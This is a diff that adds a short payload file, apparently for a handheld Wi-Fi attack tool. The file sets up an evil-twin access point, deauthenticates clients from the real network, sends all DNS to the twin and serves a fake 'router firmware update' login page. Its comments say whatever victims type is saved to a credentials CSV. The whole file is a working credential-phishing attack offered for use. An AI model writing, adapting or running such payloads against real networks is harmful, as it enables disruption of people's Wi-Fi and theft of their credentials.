@@ -1,0 +1,12 @@
+# Vandeta ucmitm payload - "router firmware update" login over the twin.
+#
+# The form posts back to the twin, so whatever is typed is written to
+# /BruceEvilCreds/ucmitm_creds.csv and shown on the run screen. No Wi-Fi
+# password is needed to run it.
+#
+#   MITM Attack > ucmitm: on > Network > pick the AP > Payload > fake-router.ucmitm
+
+twin
+deauth on
+page * html/router-login.html
+dns * this
